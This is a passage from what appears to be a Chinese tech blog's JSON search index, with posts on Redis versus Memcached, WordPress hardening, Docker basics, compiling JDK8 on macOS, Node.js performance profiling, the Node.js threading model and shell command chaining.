epoll.c、ae_kqueue.c,诸如此类。 因为Redis为每个I/O多路复用函数库都实现了相同的API,所以I/O多路复用程序的底层实现是可以互换的。 Redis与其他缓存系统对比 Nginx：多进程单线程模型 Memcached：单进程多线程模型 两者都是非关系型内存键值数据库，主要有以下不同： 数据类型Memcached 仅支持字符串类型，而 Redis 支持五种不同的数据类型，可以更灵活地解决问题。 数据持久化Redis 支持两种持久化策略：RDB 快照和 AOF 日志，而 Memcached 不支持持久化。 分布式Memcached 不支持分布式，只能通过在客户端使用一致性哈希来实现分布式存储，这种方式在存储和查询时都需要先在客户端计算一次数据所在的节点。 Redis Cluster 实现了分布式的支持。 内存管理机制在 Redis 中，并不是所有数据都一直存储在内存中，可以将一些很久没用的 value 交换到磁盘，而 Memcached 的数据则会一直在内存中。 Memcached 将内存分割成特定长度的块来存储数据，以完全解决内存碎片的问题。但是这种方式会使得内存的利用率不高，例如块的大小为 128 bytes，只存储 100 bytes 的数据，那么剩下的 28 bytes 就浪费掉了。 一个简单的论坛系统分析该论坛系统功能如下： 可以发布文章； 可以对文章进行点赞； 在首页可以按文章的发布时间或者文章的点赞数进行排序显示。 文章信息文章包括标题、作者、赞数等信息，在关系型数据库中很容易构建一张表来存储这些信息，在 Redis 中可以使用 HASH 来存储每种信息以及其对应的值的映射。 Redis 没有关系型数据库中的表这一概念来将同种类型的数据存放在一起，而是使用命名空间的方式来实现这一功能。键名的前面部分存储命名空间，后面部分的内容存储 ID，通常使用 : 来进行分隔。例如下面的 HASH 的键名为 article:92617，其中 article 为命名空间，ID 为 92617。 点赞功能当有用户为一篇文章点赞时，除了要对该文章的 votes 字段进行加 1 操作，还必须记录该用户已经对该文章进行了点赞，防止用户点赞次数超过 1。可以建立文章的已投票用户集合来进行记录。 为了节约内存，规定一篇文章发布满一周之后，就不能再对它进行投票，而文章的已投票集合也会被删除，可以为文章的已投票集合设置一个一周的过期时间就能实现这个规定。 对文章进行排序为了按发布时间和点赞数进行排序，可以建立一个文章发布时间的有序集合和一个文章点赞数的有序集合。（下图中的 score 就是这里所说的点赞数；下面所示的有序集合分值并不直接是时间和点赞数，而是根据时间和点赞数间接计算出来的） Reference 《Redis入门指南》 《Redis设计与实现》 缓存穿透，缓存击穿，缓存雪崩解决方案分析 - https://blog.csdn.net/zeb_perfect/article/details/54135506 Redis架构之防雪崩设计：网站不宕机背后的兵法 - https://mp.weixin.qq.com/s/TBCEwLVAXdsTszRVpXhVug? 为什么说Redis是单线程的以及Redis为什么这么快！ - https://blog.csdn.net/xlgen157387/article/details/79470556 Redis 网络架构及单线程模型 - http://blog.jobbole.com/100079/ 这可能是目前最全的Redis高可用技术解决方案总结 - https://mp.weixin.qq.com/s/r1ig-jO13YxbqrofJzmkfw Redis -https://cyc2018.github.io/CS-Notes/#/notes/Redis?id=%e5%85%ad%e3%80%81%e9%94%ae%e7%9a%84%e8%bf%87%e6%9c%9f%e6%97%b6%e9%97%b4","comments":true,"categories":[{"name":"CacheSystem","slug":"CacheSystem","permalink":"http://swsmile.info/categories/CacheSystem/"},{"name":"Redis","slug":"CacheSystem/Redis","permalink":"http://swsmile.info/categories/CacheSystem/Redis/"}],"tags":[{"name":"Cache System","slug":"Cache-System","permalink":"http://swsmile.info/tags/Cache-System/"},{"name":"Redis","slug":"Redis","permalink":"http://swsmile.info/tags/Redis/"}]},{"title":"【WordPress】WordPress安全性设置","date":"2018-11-12T13:01:25.000Z","path":"2018/11/12/【WordPress】WordPress安全性设置/","text":"自动安全扫描安装安全插件 如 WordFence。安全插件能做的事，除了自动扫描还有很多，可以仔细查看插件配置页面。 安全渗透应用工具管理员账号 修改管理员账号为随机字符串，较长位数的密码 MySQL1234567891011hostname localhostmysql -u root -p// yRqyGEKK is the DB name for WordPressCREATE DATABASE yRqyGEKK;// Create a specific user who can only aceess WordPress&apos;s DBCREATE USER wordpressuser@localhost IDENTIFIED BY &apos;password&apos;;GRANT ALL PRIVILEGES ON yRqyGEKK.* TO wordpressuser@localhost IDENTIFIED BY &apos;password&apos;;FLUSH PRIVILEGES;exit 使用随机字符串作为 MySQL 中服务于WordPress 的 DB name。 为该 DB 创建特定的用户，该用户只具有对该 DB 中所有 table 的增删查改权限（最小权限原则）。当然，在上面的例子中，我为该用户赋予了对该 DB 中所有 table 的所有权限 无法从外部连接MySQL，只能在本机（localhost）连接并访问 端口 关闭不需要的服务 只对外暴露需要对外提供服务的端口，如80（HTTP），443（HTTPS）","comments":true,"categories":[{"name":"WordPress","slug":"WordPress","permalink":"http://swsmile.info/categories/WordPress/"}],"tags":[{"name":"WordPress","slug":"WordPress","permalink":"http://swsmile.info/tags/WordPress/"}]},{"title":"【Docker】Docker 的基本使用","date":"2018-11-12T12:56:58.000Z","path":"2018/11/12/【Docker】Docker的基本使用/","text":"Docker 启动Docker 是服务器—-客户端架构。命令行运行docker命令的时候，需要本机有 Docker 服务。如果这项服务没有启动，可以用下面的命令启动： 12345# service 命令的用法$ sudo service docker start# systemctl 命令的用法$ sudo systemctl start docker image 文件Docker 把应用程序及其依赖，打包在 image 文件里面。只有通过这个文件，才能生成 Docker 容器。image 文件可以看作是容器的模板。Docker 根据 image 文件生成容器的实例。同一个 image 文件，可以生成多个同时运行的容器实例。 12345# 列出本机的所有 image 文件。$ docker image ls# 删除 image 文件$ docker image rm [imageName] image 文件是通用的，一台机器的 image 文件拷贝到另一台机器，照样可以使用。一般来说，为了节省时间，我们应该尽量使用别人制作好的 image 文件，而不是自己制作。即使要定制，也应该基于别人的 image 文件进行加工，而不是从零开始制作。 为了方便共享，image 文件制作完成后，可以上传到网上的仓库。Docker 的官方仓库 Docker Hub 是最重要、最常用的 image 仓库。此外，出售自己制作的 image 文件也是可以的。 实例：hello world首先，运行下面的命令，将 image 文件从仓库抓取到本地。 12&gt; $ docker image pull library/hello-world&gt; 上面代码中，docker image pull是抓取 image 文件的命令。library/hello-world是 image 文件在仓库里面的位置，其中library是 image 文件所在的组，hello-world是 image 文件的名字。 由于 Docker 官方提供的 image 文件，都放在library组里面，所以它的是默认组，可以省略。因此，上面的命令可以写成下面这样。 12&gt; $ docker image pull hello-world&gt; 抓取成功以后，就可以在本机看到这个 image 文件了。 12&gt; $ docker image ls&gt; 现在，运行这个 image 文件。 12&gt; $ docker container run hello-world&gt; docker container run命令会从 image 文件，生成一个正在运行的容器实例。 注意，docker container run命令具有自动抓取 image 文件的功能。如果发现本地没有指定的 image 文件，就会从仓库自动抓取。因此，前面的docker image pull命令并不是必需的步骤。 如果运行成功，你会在屏幕上读到下面的输出。 1234567&gt; $ docker container run hello-world&gt; &gt; Hello from Docker!&gt; This message shows that your installation appears to be working correctly.&gt; &gt; ... ...&gt; 输出这段提示以后，hello world就会停止运行，容器自动终止。 有些容器不会自动终止，因为提供的是服务。比如，安装运行 Ubuntu 的 image，就可以在命令行体验 Ubuntu 系统。 下面命令，生成并启动了Ubuntu 的 image（的实例），并在控制台输出“Hello”，最后终止这个Ubuntu容器实例 1$ docker container run ubuntu /bin/echo \"Hello\" 管理容器image 文件生成的容器实例，本身也是一个文件，称为容器文件。也就是说，一旦容器生成，就会同时存在两个文件： image 文件和容器文件。而且关闭容器并不会删除容器文件，只是容器停止运行而已。 新建通过docker的两个参数 -i -t，让docker运行的容器实现”对话”的能力 -t:在新容器内指定一个伪终端或终端。 -i:允许你对容器内的标准输入 (STDIN) 进行交互。 其他参数： —name：为该容器指定名称 -p：指定端口映射 比如，我们新建并启动一个Ubuntu容器实例，并将当前控制台作为这个实例的控制台。并在这个实例中输入cat /proc/version和ls以分别查看当前系统版本信息和当前目录下文件列表 1$ docker container run -it ubuntu /bin/bash 我们可以在控制台中再打开一个tab，以查看刚才这个Ubuntu容器实例的运行情况： docker container run命令是新建并启动容器，每运行一次，就会新建一个容器。同样的命令运行两次，就会生成两个一模一样的容器文件。如果希望重复使用容器，就要使用docker container start命令，它用来启动已经生成、已经停止运行的容器文件。 12&gt; $ docker container start [containerID/containerName]&gt; 比如这里docker start -i ubuntu2与docker start -i 9aaa62cc0621是完全等效的。 使用 Dockerfile 定制镜像Dockerfile 是一个文本文件，其内包含了一条条的指令(Instruction)，每一条指令构建一层，因此每一条指令的内容，就是描述该层应当如何构建。 在一个空白目录中，建立一个文本文件，并命名为 Dockerfile： 123$ mkdir mynginx$ cd mynginx$ touch Dockerfile Dockerfile文件： 1234567891011121314FROM debian:jessieRUN buildDeps='gcc libc6-dev make' \\ &amp;&amp; apt-get update \\ &amp;&amp; apt-get install -y $buildDeps \\ &amp;&amp; wget -O redis.tar.gz \"http://download.redis.io/releases/redis-3.2.5.tar.gz\" \\ &amp;&amp; mkdir -p /usr/src/redis \\ &amp;&amp; tar -xzf redis.tar.gz -C /usr/src/redis --strip-components=1 \\ &amp;&amp; make -C /usr/src/redis \\ &amp;&amp; make -C /usr/src/redis install \\ &amp;&amp; rm -rf /var/lib/apt/lists/* \\ &amp;&amp; rm redis.tar.gz \\ &amp;&amp; rm -r /usr/src/redis \\ &amp;&amp; apt-get purge -y --auto-remove $buildDeps 共享docker镜像方法1：打成.tar包，复制该.tar到其他主机12sudo docker save -o demo.tar demosudo docker load &lt; demo.tar 方法2：docker export/import方法3：使用docker hubReference http://www.youruncloud.com/docker/1_37.html https://yeasy.gitbooks.io/docker_practice/image/build.html https://yeasy.gitbooks.io/docker_practice/image/dockerfile/copy.html","comments":true,"categories":[{"name":"Docker","slug":"Docker","permalink":"http://swsmile.info/categories/Docker/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"http://swsmile.info/tags/Docker/"}]},{"title":"【Java】macOS下编译JDK8","date":"2018-11-12T12:48:41.000Z","path":"2018/11/12/【Java】编译与反编译-macOS下编译JDK8/","text":"安装mercurialbrew install mercurial 下载源码1234hg clone http://hg.openjdk.java.net/jdk8/jdk8 java-sourcecd java-sourcechmod +x get_source.sh./get_source.sh 安装依赖brew install freetype 修改源代码1. 修改relocInfo.hpp的367行（hotspot/src/share/vm/code/relocInfo.hpp） 修改前: 1inline friend relocInfo prefix_relocInfo(int datalen=0); 修改后: 1inline friend relocInfo prefix_relocInfo(int datalen); 2. 修改generated-configure.sh的20061和21640行（common/autoconf/generated-configure.sh），解决configure: error: GCC compiler is required 错误 修改前为: 1as_fn_error $? &quot;GCC compiler is required. Try setting --with-tools-dir.&quot; &quot;$LINENO&quot; 5 修改后为: 1#as_fn_error $? &quot;GCC compiler is required. Try setting --with-tools-dir.&quot; &quot;$LINENO&quot; 5 本机的xcode为7.3.1，编译器为clang，版本为Apple LLVM version 7.3.0 (clang-703.0.31)；而jdk编译默认需要gcc编译器，由于clang703已经支持大部分的gcc语法，因此此处是直接注释掉编译器检查，当然也可以安装gcc编译器进行编译； 注意：编译器的版本很重要，否则会报一大堆语法错误；如果采用gcc,要求&gt;=3.81 3. 修改hotspot/src/share/vm/opto/loopPredicate.cpp，_igvn.type(rng)-&gt;is_int() &gt;= 0 改成 _igvn.type(rng)-&gt;is_int()-&gt;_lo &gt;= 0否则会出现以下错误： 123/Volumes/Working/java-source/hotspot/src/share/vm/opto/loopPredicate.cpp:775:73: error: ordered comparison between pointer and zero (&apos;const TypeInt *&apos; and &apos;int&apos;) assert(rng-&gt;Opcode() == Op_LoadRange || _igvn.type(rng)-&gt;is_int() &gt;= 0, &quot;must be&quot;); ~~~~~~~~~~~~~~~~~~~~~~~~~ ^ ~ 4. 修改hotspot/src/share/vm/runtime/virtualspace.cppbase() &gt; 0 改成 base() != 0 否则会出现以下错误： 123/Volumes/Working/java-source/hotspot/src/share/vm/runtime/virtualspace.cpp:331:14: error: ordered comparison between pointer and zero (&apos;char *&apos; and &apos;int&apos;) if (base() &gt; 0) &#123; ~~~~~~ ^ ~ 编译1chmod a+x configure 编译配置1./configure --with-debug-level=slowdebug --with-boot-jdk=/Library/Java/JavaVirtualMachines/jdk1.8.0_181.jdk/Contents/Home --with-freetype-include=/usr/local/Cellar/freetype/2.9.1/include/freetype2 --with-freetype-lib=/usr/local/Cellar/freetype/2.9.1/lib --with-target-bits=64 --with-jvm-variants=server --with-jdk-variant=normal --with-milestone=internal --with-num-cores=2 --with-jobs=4 CC=clang CXX=clang++ 注意：上面带版本号的地方（本机JDK路径，freetype路径）根据实际情况替换 若正常，会出现以下输出： 编译1make COMPILER_WARNINGS_FATAL=false LFLAGS=&apos;-Xlinker -lstdc++&apos; CC=clang USE_CLANG=true LP64=1 完成最后我们看到了这样的输出 123456789101112----- Build times -------Start 2018-09-13 10:47:14End 2018-09-13 10:58:2400:02:12 corba00:00:39 hotspot00:00:56 jaxp00:00:59 jaxws00:06:21 jdk00:00:00 langtools00:11:10 TOTAL-------------------------Finished building OpenJDK for target &apos;default&apos; 测试12345$ cd build/macosx-x86_64-normal-server-slowdebug/jdk/bin$ ./java -versionopenjdk version &quot;1.8.0-internal-debug&quot;OpenJDK Runtime Environment (build 1.8.0-internal-debug-kiva_2018_02_24_20_52-b00)OpenJDK 64-Bit Server VM (build 25.0-b70-debug, mixed mode) Referencehttps://imkiva.com/2018/02/24/building-openjdk8-on-macos/ https://www.jianshu.com/p/4e01daf8c357 https://juejin.im/post/5a6d7d106fb9a01ca47abd8b","comments":true,"categories":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://swsmile.info/tags/Java/"}]},{"title":"【Node.js】Node.js 应用性能监测与分析","date":"2018-11-12T01:53:20.000Z","path":"2018/11/12/【Node-js】Node-js-应用性能监测与分析/","text":"监控指标（Metrics to watch）Tick频率（Tick frequency） - number of ticks per time Tick周期（Tick Duration） - the time one tick takes Active Handles and Requests Garbbage Collection activity CPU 使用（CPU Usage） 堆使用（Heap Usage） 内存使用（Memory usage） 吞吐量（Throughput） 响应时间（Response Time） 开源项目Olegas/node-event-loop-monitor bretcope/node-gc-profiler Bnoordhuis/node-heapdump 内存泄漏 性能优化的好处 使用更少的内存 使用更少的CPU资源 app运行更快 性能分析场景1-长耗时的同步任务当Node应用具有很高的CPU使用率（CPU usage）时，表明此时在进行大量的同步任务，这意味着Event Loop 中的异步回调很有可能会被延迟执行。 1234567891011121314151617181920212223242526272829303132333435363738394041function fibonacci(n) &#123; if(n==0 || n == 1) return n; return fibonacci(n-1) + fibonacci(n-2);&#125;var timeoutScheduled = Date.now();var result=fibonacci(45);const delay = Date.now() - timeoutScheduled;console.log(\"finish fibonacci\");console.log(`$&#123;delay&#125;ms fibonacci`);setTimeout(() =&gt; &#123; const delay = Date.now() - timeoutScheduled; console.log('setTimeout'); console.log(`$&#123;delay&#125;ms setTimeout`);&#125;, 5);setImmediate(() =&gt; &#123; const delay = Date.now() - timeoutScheduled; console.log('setImmediate1'); console.log(`$&#123;delay&#125;ms setImmediate1`);&#125;);setImmediate(() =&gt; &#123; const delay = Date.now() - timeoutScheduled; console.log('setImmediate2'); console.log(`$&#123;delay&#125;ms setImmediate2`);&#125;);process.nextTick(() =&gt; &#123; const delay = Date.now() - timeoutScheduled; console.log('process.nextTick'); console.log(`$&#123;delay&#125;ms process.nextTick`);&#125;); 执行结果：1234567891011$ node main.jsfinish fibonacci12421ms fibonacciprocess.nextTick12424ms process.nextTicksetImmediate112425ms setImmediate1setImmediate212425ms setImmediate2setTimeout12429ms setTimeout 分析：可以看到，同步任务fibonacci执行了12421ms，所有的异步回调都被阻塞了，直到这个同步任务完成后，才依次被执行。 同时，该node进程的CPU使用率为几乎100%，而整机的CPU的使用率却相对非常低（空闲率为80%），这是因为这个fibonacci同步任务仅仅在一个线程中执行，因此无法充分利用多核CPU的计算能力。 判断异步回调是否被阻塞，Tick频率或Tick周期是一个最简单的判断指标。 场景2 大量同步任务调用上一种场景，是针对Node应用具有很高的CPU使用率（CPU usage）。而当应用的CPU使用率很低时，却并不意味着Event Loop 中的异步回调没有被大量延迟执行。 一个典型的例子，就是Node代码中存在大量的同步IO操作，比如fs.readFileSync()的调用 总结阻塞后的Event Loop体现出高延迟低空闲（High event loop lag, low event loop idle）的特点。 典型的阻塞Event Loop的 Node API调用分类成两种情况： 同步的CPU密集型操作 加密操作 - Crypto 模块中crypto.pbkdf2() crypto.randomBytes()`` crypto.randomFill()方法 压缩操作 - Zlib模块中没有显式使用libuv线程池进行同步调用的方法 同步的IO密集型操作 DNS模块中的 dns.lookup()和dns.lookupService() File System模块中 除了fs.FSWatcher()和那些没有显式使用libuv线程池进行同步调用的方法 找到event loop的Tick Duration增加的原因，是优化Node应用的一个关键。而将这些同步的API调用放到Node中工作池（Worker Pool）中，是一个有效的解决办法。 场景3 - 内存泄漏http://pmuellr.github.io/slides/2017/01-profiling-node/demos/express-demo.js.html 工具profiler inside V8https://nodejs.org/en/docs/guides/simple-profiling/ Node Application MetricsNode Application Metrics （https://github.com/RuntimeTools/appmetrics）是一个由IBM开发的专门针对Node.js应用的性能资源监测数据采集工具。 在数据采集完成后，可以通过Node Application Metrics Dashboard（https://github.com/RuntimeTools/appmetrics-dash）将性能指标（Performance Metrics）可视化显示。 Node Application Metrics收集的原始数据包括： Source Description Environment Machine and runtime environment information CPU Process and system CPU Memory Process and system memory usage GC Node/V8 garbage collection statistics Event Loop Event loop latency information Loop Event loop timing metrics Function profiling Node/V8 function profiling (disabled by default) HTTP HTTP request calls made of the application HTTP Outbound HTTP requests made by the application socket.io WebSocket data sent and received by the application LevelDB LevelDB queries made by the application MySQL MySQL queries made by the application MongoDB MongoDB queries made by the application PostgreSQL PostgreSQL queries made by the application MQTT MQTT messages sent and received by the application MQLight MQLight messages sent and received by the application Memcached Data that is stored or manipulated in Memcached OracleDB OracleDB queries made by the application Oracle Oracle queries made by the application StrongOracle StrongOracle database queries made by the application Redis Redis commands issued by the application Riak Riak methods called by the application Request tracking A tree of application requests, events and optionally trace (disabled by default) Function trace Tracing of application function calls that occur during a request (disabled by default) Application Metrics for Node.js1234567npm install -S appmetrics-dash# In your Node.js application, add:require('appmetrics-dash').monitor();# Monitor your running Node.js application in a web browser at:localhost:3001/appmetrics-dash easy-monitor12npm install expressnpm install easy-monitor main.js1234567891011&apos;use strict&apos;;const easyMonitor = require(&apos;easy-monitor&apos;);easyMonitor(&apos;Mercury&apos;);const express = require(&apos;express&apos;);const app = express();app.get(&apos;/hello&apos;, function (req, res, next) &#123; res.send(&apos;hello&apos;);&#125;);app.listen(8082); Node Reporthttps://www.npmjs.com/package/node-report NodeSource N|Solid Platformhttps://nodesource.com/products/nsolid https://docs.nodesource.com/nsolid/3.4/docs#console-overview npm module v8-profilerhttps://www.youtube.com/watch?v=gL2GGcV_f20 V8 Inspectorhttps://nodejs.org/dist/latest-v6.x/docs/api/debugger.html#debugger_v8_inspector_integration_for_node_js 分析函数执行时间 - V8 CPU profiler 找到应用中的瓶颈（bottleneck） 优化应用性能 分析内存使用 - V8 heap snapshots profiler 发现内存泄漏 优化程序的内存使用 Referencehttps://www.dynatrace.com/news/blog/all-you-need-to-know-to-really-understand-the-node-js-event-loop-and-its-metrics/ https://nodejs.org/en/docs/guides/dont-block-the-event-loop/ https://nodesource.com/blog/node-js-performance-monitoring-part-3-debugging-the-event-loop/ https://blog.ghaiklor.com/profiling-nodejs-applications-1609b77afe4e https://blog.risingstack.com/monitoring-nodejs-applications-nodejs-at-scale/ https://blog.appdynamics.com/product/top-5-performance-metrics-for-node-js-applications/ https://www.youtube.com/watch?v=9RhOGoChGqo http://pmuellr.github.io/slides/2017/01-profiling-node/#24 http://pmuellr.github.io/slides/2016/01-intro-to-profiling/intro-to-profiling.pdf","comments":true,"categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://swsmile.info/categories/Nodejs/"}],"tags":[{"name":"Node.js","slug":"Node-js","permalink":"http://swsmile.info/tags/Node-js/"}]},{"title":"【Node.js】Node.js中的单线程模型与多线程/进程","date":"2018-11-12T01:49:04.000Z","path":"2018/11/12/【Node-js】Node-js中的单线程模型与多线程-进程/","text":"JavaScript语言的一大特点就是单线程，也就是说，同一个时间只能做一件事。 那么，为什么JavaScript不能有多个线程呢？这样能提高效率啊。 JavaScript的单线程模型JavaScript的单线程，与它的用途有关。作为浏览器脚本语言，JavaScript的主要用途是与用户互动，以及操作DOM。这决定了它只能是单线程，否则会带来很复杂的同步问题。比如，假定JavaScript同时有两个线程，一个线程在某个DOM节点上添加内容，另一个线程删除了这个节点，这时浏览器应该以哪个线程为准？ 所以，为了避免复杂性，从一诞生，JavaScript就是单线程，这已经成了这门语言的核心特征，将来也不会改变。 更准确地说，在Node中只有一个线程执行JavaScript代码，Event Loop中触发所有的回调函数也运行在这个线程中。在浏览器中，指的是 JavaScript执行线程与UI渲染共用的一个线程。 在浏览器中，由于浏览器中JavaScript与UI渲染共用一个线程，JavaScript长时间执行会导致UI的渲染和响应被中断。在Node中，长时间占用CPU的同步任务也会导致后续的同步任务不能被及时执行，已完成的异步I/O的回调函数也会得不到及时调用。 而且，在Node中，主线程与其余线程是无法共享任何状态的。单线程的最大好处是不用像多线程编程那样处处在意状态的同步问题，没有死锁的存在，也没有线程上下文交换所带来的性能上的开销。 一个需要强调的地方在于我们时常提到Node是单线程的， 这里的单线程仅仅只是 JavaScript执行在单线程中罢了（而不是指一个Node进程中永远都只有一个线程）。而事实上，Node进程自身其实是多线程的。无论是*nix还是Windows平台，内部完成I/O任务的另有线程池。 单线程的不足同样，单线程也有它自身的不足。单线程的不足具体在以下三方面： 无法利用多核CPU。 错误会引起整个应用退出，应用的健壮性值得考验。 具体来说，Node.js 会在一个线程中处理大量请求，如果处理某个请求时，产生了一个没有被捕获到的异常，这将会导致整个Node进程的退出，已经接收到的其它连接全部都无法处理，对一个 Web 服务器来说，这绝对是致命的灾难 而在如Tomcat等基于per Thread per Request的模型中，每个 request 都在单独的线程中处理，即使某一个请求发生很严重的错误也不会影响到其它请求 大量计算占用CPU导致无法继续调用异步I/O。 一个体现Node单线程不足的例子1234567891011121314151617181920212223242526272829303132333435363738394041function fibonacci(n) &#123; if(n==0 || n == 1) return n; return fibonacci(n-1) + fibonacci(n-2);&#125;var timeoutScheduled = Date.now();var result=fibonacci(45);const delay = Date.now() - timeoutScheduled;console.log(\"finish fibonacci\");console.log(`$&#123;delay&#125;ms fibonacci`);setTimeout(() =&gt; &#123; const delay = Date.now() - timeoutScheduled; console.log('setTimeout'); console.log(`$&#123;delay&#125;ms setTimeout`);&#125;, 5);setImmediate(() =&gt; &#123; const delay = Date.now() - timeoutScheduled; console.log('setImmediate1'); console.log(`$&#123;delay&#125;ms setImmediate1`);&#125;);setImmediate(() =&gt; &#123; const delay = Date.now() - timeoutScheduled; console.log('setImmediate2'); console.log(`$&#123;delay&#125;ms setImmediate2`);&#125;);process.nextTick(() =&gt; &#123; const delay = Date.now() - timeoutScheduled; console.log('process.nextTick'); console.log(`$&#123;delay&#125;ms process.nextTick`);&#125;); 输出： 1234567891011$ node main.jsfinish fibonacci13010ms fibonacciprocess.nextTick13014ms process.nextTicksetImmediate113014ms setImmediate1setImmediate213014ms setImmediate2setTimeout13018ms setTimeout 可以明显看到所有的异步操作（easy task）均被Fibonacci的计算（difficult task）阻塞了，如下图所示： 这是一个典型的CPU密集型（CPU intensive）场景，Node.js为了解决在CPU密集型应用中，异步回调被长期阻塞的问题，引入了多进程机制。 因此，我们通过总结Node 的两种不同应用场景来讨论解决方案。 Node 的应用场景关于Node，探讨得较多的主要有I/O密集型和CPU密集型。 I/O密集型Node擅长I/O密集型的应用场景基本上是没人反对的。Node面向网络且擅长并行I/O，能够有效地组织起更多的硬件资源，从而提供更多的服务。 I/O密集的优势主要在于Node利用事件循环（Event Loop）的处理能力，而不是启动每一个线程为每一个请求服务，资源占用极少。 CPU密集型CPU密集型应用给Node 带来的挑战主要是：由于JavaScript单线程的原因，如果有长时间运行的计算（比如大循环），将会导致CPU时间片不能释放，使得后续I/O无法发起。 上面讨论的Fibonacci的例子，就是一个典型的CPU密集型场景。 然而，Node为我们提供了解决方案，即通过适当调整和分解大型运算任务为多个小任务，运算能够适时释放，从而不阻塞I/O调用的发起。这样既可同时享受到并行异步I/O的好处，又能充分利用CPU。 关于CPU密集型应用，Node的异步I/O已经解决了在单线程上CPU与I/O之间阻塞无法重叠利用的问题， I/O阻塞造成的性能浪费远比CPU的影响小。对于长时间运行的计算，如果它的耗时超过普通阻塞I/O的耗时，那么应用场景就需要重新评估，因为这类计算比阻塞I/O还影响效率，甚至说就是一个纯计算的场景，根本没有I/O。 此类应用场景可采用创建多进程或者编写C/C++扩展的方式进行解决。来实现充分利用CPU。 通过子进程的方式，将一部分Node进程当做常驻服务进程用于计算，然后利用进程间的消息来传递结果，将计算与I/O分离，这样还能充分利用多CPU。 Node可以通过编写C/C++扩展的方式更高效地利用CPU，将一些V8不能做到性能极致的地方通过C/C++来实现。由上面的测试结果可以看到，通过C/C++扩展的方式实现斐波那契数列计算，速度比Java还快。 Node中创建多进程由于Node基于单线程，当Node进行大量计算（CPU密集型计算）时，会因为已完成的异步I/O的回调函数会得不到及时执行，而导致应用在较长时间内无响应。同时，Node无法利用现代CPU的多个核。 child_process 模块 - 创建子进程为了解决这个问题，Node采用了与HTML5 的Web Workers中相同的思路来解决因单线程设计而导致的不足。即允许使用子进程（child_process），Node 提供了 child_process 模块来创建子进程。 通过将计算分发到各个子进程，可以将大量计算分解掉，然后再通过进程之间的事件消息来传递结果（即消息传递的方式来传递运行结果），这可以很好地保持应用模型的简单和低依赖。通过Master-Worker的管理方式，也可以很好地管理各个工作进程，以达到更高的健壮性。 一个Demomaster.js123456789101112131415161718const fs = require('fs');const child_process = require('child_process'); for(var i=0; i&lt;3; i++) &#123; var workerProcess = child_process.exec('node support.js '+i, function (error, stdout, stderr) &#123; if (error) &#123; console.log(error.stack); console.log('Error code: '+error.code); console.log('Signal received: '+error.signal); &#125; console.log('stdout: ' + stdout); console.log('stderr: ' + stderr); &#125;); workerProcess.on('exit', function (code) &#123; console.log('子进程已退出，退出码 '+code); &#125;);&#125; support.js1console.log(\"进程 \" + process.argv[2] + \" 执行。\" ); cluster 模块 - 创建子进程 除此之外，还可以使用cluster 模块。cluster 模块对 child_process 模块提供了一层封装，可以说是为了发挥服务器多核优势而量身定做的。 cluster 模块的工作的结构很简单。我们创建一个主进程并且主进程衍生（fork）了一些工作进程（worker process），然后管理它们。每一个工作进程代理表了一个我们想要扩展的应用的一个实例。所有到来的请求都被主进程所处理，它决定着哪一个工作进程应该处理一个到来的请求。 简单的一个 fork方法，不需要开发者修改任何的应用代码便能够实现多进程部署。 cluster用起来更加简单便捷。虽然cluster模块繁衍线程实际上用的也是child_process.fork，但它对资源的管理要比我们自己直接用child_process.fork管理得更好。 fork 是 cluster 模块中非常重要的一个方法，底层是依赖*nix的 fork 函数来实现的。 多个子进程便是通过在master进程中不断的调用 cluster.fork 方法构造出来。 最初的 Node.js 多进程模型就是这样实现的，master 进程创建 socket，绑定到某个地址以及端口后，自身不调用 listen 来监听连接以及 accept 连接，而是将该 socket 的 fd 传递到 fork 出来的 worker 进程，worker 接收到 fd 后再调用 listen，accept 新的连接。但实际一个新到来的连接最终只能被某一个 worker 进程 accpet 再做处理，至于是哪个 worker 能够 accept 到，开发者完全无法预知以及干预。这势必就导致了当一个新连接到来时，多个 worker 进程会产生竞争，最终由胜出的 worker 获取连接。 123456789101112131415161718192021var cluster = require('cluster'),…// heroku config compatiblevar MAX_PROCESSES = process.env.MAX_PROCESSES || 5;…if (cluster.isMaster) &#123; // fork! for (var i = 0; i &lt; MAX_PROCESSES; i++) &#123; cluster.fork(); &#125; cluster.on('exit', function(worker, code, signal) &#123; console.log('worker ' + worker.process.pid + ' died'); &#125;)&#125; else &#123; http.createServer(app).listen(app.get('port'), function()&#123; console.log(\"Express server listening on port \" + app.get('port')); &#125;);&#125; 线程池 Reference 《深入浅出Node.js》 cluster 模块 - http://taobaofed.org/blog/2015/11/03/nodejs-cluster/ CPU密集型任务 - http://www.infoq.com/cn/articles/nodejs-weakness-cpu-intensive-tasks 浅析 Node.js 在 CPU 密集型问题上应用 - https://www.ibm.com/developerworks/cn/opensource/os-cn-nodejscpu/index.html Running CPU Intensive task in Nodejs - https://medium.com/@badewakayode/running-cpu-intensive-task-in-nodejs-db4f995db310 Overview of Blocking vs Non-Blocking - https://nodejs.org/en/docs/guides/blocking-vs-non-blocking/ 当我们谈论 cluster 时我们在谈论什么（下）http://taobaofed.org/blog/2015/11/10/nodejs-cluster-2/ https://neilk.net/projects/letterpwn/letterpwn-node-brigade.pdf http://taobaofed.org/blog/2015/11/03/nodejs-cluster/ http://www.alloyteam.com/2015/08/nodejs-cluster-tutorial/ https://zhuanlan.zhihu.com/p/36728299 https://zhuanlan.zhihu.com/p/41118827 https://cnodejs.org/topic/518b679763e9f8a5424406e9 https://bjouhier.wordpress.com/2012/03/11/fibers-and-threads-in-node-js-what-for/","comments":true,"categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://swsmile.info/categories/Nodejs/"}],"tags":[{"name":"Node.js","slug":"Node-js","permalink":"http://swsmile.info/tags/Node-js/"}]},{"title":"【Linux】Shell 脚本","date":"2018-11-12T01:41:50.000Z","path":"2018/11/12/【Linux】Shell 脚本/","text":"0 基本分号分号（;）是命令的结束符，使得一行可以放置多个命令，上一个命令执行结束后，再执行第二个命令。 1$ clear; ls 上面例子中，Bash 先执行clear命令，执行完成后，再执行ls命令。 注意，使用分号时，第二个命令总是接着第一个命令执行，不管第一个命令执行成功或失败。 命令的组合符&amp;&amp;和||除了分号，Bash 还提供两个命令组合符&amp;&amp;和||，允许更好地控制多个命令之间的继发关系。 1$ Command1 &amp;&amp; Command2 上面命令的意思是，如果Command1命令运行成功，则继续运行Command2命令。 1$ Command1 || Command2 上面命令的意思是，如果Command1命令运行失败，则继续运行Command2命令。 下面是一些例子。 1$ cat 